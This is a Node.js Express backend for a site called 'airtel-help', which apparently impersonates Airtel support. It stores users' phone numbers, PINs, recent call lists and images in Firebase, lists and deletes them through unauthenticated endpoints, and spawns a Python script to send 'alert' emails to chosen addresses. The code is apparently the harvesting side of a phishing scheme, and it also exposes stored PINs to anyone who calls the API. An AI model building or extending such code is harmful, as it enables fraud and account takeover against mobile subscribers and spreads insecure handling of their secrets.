const admin = require("firebase-admin");
const express = require("express");
const cors = require("cors");
const { spawn } = require("child_process"); // Import pour exécuter des scripts externes

// --- Connexion à Firebase depuis un serveur externe ---
// Logique professionnelle pour gérer les identifiants de manière sécurisée.
let serviceAccount;
// En production (comme sur Render), on s'attend à une variable d'environnement.
// Render définit NODE_ENV à 'production' par défaut.
if (process.env.NODE_ENV === 'production') {
  if (!process.env.GOOGLE_APPLICATION_CREDENTIALS_JSON) {
    console.error("ERREUR FATALE: La variable d'environnement GOOGLE_APPLICATION_CREDENTIALS_JSON est manquante en environnement de production.");
    console.error("Veuillez la configurer dans l'onglet 'Environment' de votre service d'hébergement (Render).");
    process.exit(1); // Arrête le processus immédiatement
  }
  serviceAccount = JSON.parse(process.env.GOOGLE_APPLICATION_CREDENTIALS_JSON);
} else {
  // En local (développement), on charge le fichier qui est dans .gitignore.
  try {
    serviceAccount = require("./serviceAccountKey.json");
  } catch (error) {
    console.error("\nERREUR: Le fichier 'serviceAccountKey.json' est introuvable pour le développement local.");
    console.error("Assurez-vous d'avoir téléchargé ce fichier depuis votre console Firebase et de l'avoir placé dans le dossier 'backend'.\n");
    process.exit(1); // Arrête l'application si les identifiants sont manquants en local.
  }
}

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const app = express();
const PORT = process.env.PORT || 3001; // Render fournira la variable PORT

// Middleware pour parser le JSON dans les requêtes (bonne pratique)
app.use(express.json());

// Utilise CORS pour autoriser les requêtes depuis votre site web hébergé.
// Configuration CORS professionnelle pour autoriser le déploiement et le développement local.
const allowedOrigins = [
  'https://airtel-help.web.app', // Votre site en production
  'http://localhost:5500',       // Pour tester avec Live Server
  'http://127.0.0.1:5500'      // Alternative pour le test local
];

const corsOptions = {
  origin: function (origin, callback) {
    // Autorise les requêtes sans origine (ex: Postman, applications mobiles)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'La politique CORS pour ce site n\'autorise pas l\'accès depuis cette origine.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  }
};
app.use(cors(corsOptions));

// Ajout d'une route racine pour vérifier que l'API est en ligne (Health Check).
app.get("/", (req, res) => {
  res.status(200).send("Airtel Verification API is running and ready.");
}); 

// Les points de terminaison (endpoints) de notre API qui seront appelés par admin.js
app.get("/api/submissions", async (req, res) => {
  try {
    const db = admin.firestore();
    // Récupère toutes les soumissions de la collection "submissions", triées par date (la plus récente en premier)
    const submissionsRef = db.collection("submissions");
    const snapshot = await submissionsRef.orderBy("submittedAt", "desc").get();

    if (snapshot.empty) {
      return res.status(200).json([]);
    }

    const submissions = [];
    snapshot.forEach((doc) => {
      const data = doc.data();
      submissions.push({
        id: doc.id,
        phoneNumber: data.phoneNumber,
        pin: data.pin, // ATTENTION: Pour un vrai projet, ne jamais exposer le PIN.
        lastCalls: data.lastCalls,
        imageUrl: data.imageUrl,
        // Convertit le Timestamp Firebase en une chaîne de caractères standard (ISO) que JavaScript peut lire.
        // Ajout d'une vérification pour éviter un crash si la date est manquante ou invalide.
        submittedAt: (data.submittedAt && typeof data.submittedAt.toDate === 'function')
          ? data.submittedAt.toDate().toISOString()
          : new Date(0).toISOString(), // Fournit une date par défaut (1970) si invalide
      });
    });

    return res.status(200).json(submissions);
  } catch (error) {
    console.error("Erreur lors de la récupération des soumissions:", error);
    return res.status(500).send("Erreur interne du serveur.");
  }
});

app.delete("/api/submissions/:id", async (req, res) => {
  try {
    const { id } = req.params;
    if (!id) {
      return res.status(400).send("ID de soumission manquant.");
    }
    const db = admin.firestore();
    await db.collection("submissions").doc(id).delete();
    return res.status(200).json({ message: "Soumission supprimée avec succès." });
  } catch (error) {
    console.error("Erreur lors de la suppression de la soumission:", error);
    return res.status(500).send("Erreur interne du serveur.");
  }
});

// --- NOUVELLE ROUTE POUR ENVOYER L'ALERTE PAR E-MAIL ---
app.post("/api/send-alert", (req, res) => {
  const { email } = req.body;

  if (!email || !email.includes('@')) {
    return res.status(400).json({ success: false, message: "Adresse e-mail invalide ou manquante." });
  }

  console.log(`[Node.js] Requête reçue pour envoyer une alerte à : ${email}`);
  console.log(`[Node.js] Lancement du script Python...`);

  // Exécute le script Python en tant que processus enfant
  // 'python3' est généralement disponible sur Render. Si ça ne marche pas, essayez 'python'.
  const pythonProcess = spawn('python3', ['./python_scripts/send_alert_email.py', email]);

  let scriptOutput = '';
  let scriptError = '';

  // Écoute la sortie standard du script Python (les 'print')
  pythonProcess.stdout.on('data', (data) => {
    const output = data.toString();
    scriptOutput += output;
    console.log(`[Python STDOUT] ${output}`);
  });

  // Écoute la sortie d'erreur du script Python
  pythonProcess.stderr.on('data', (data) => {
    const errorOutput = data.toString();
    scriptError += errorOutput;
    console.error(`[Python STDERR] ${errorOutput}`);
  });

  // Quand le script Python se termine
  pythonProcess.on('close', (code) => {
    console.log(`[Node.js] Le script Python s'est terminé avec le code ${code}`);
    if (code === 0 && scriptError === '') {
      res.status(200).json({ success: true, message: "La requête d'envoi a été traitée avec succès." });
    } else {
      res.status(500).json({ success: false, message: "Le script d'envoi a rencontré une erreur.", error: scriptError || scriptOutput });
    }
  });
});

app.listen(PORT, () => {
  console.log(`Le serveur écoute sur le port ${PORT}`);
});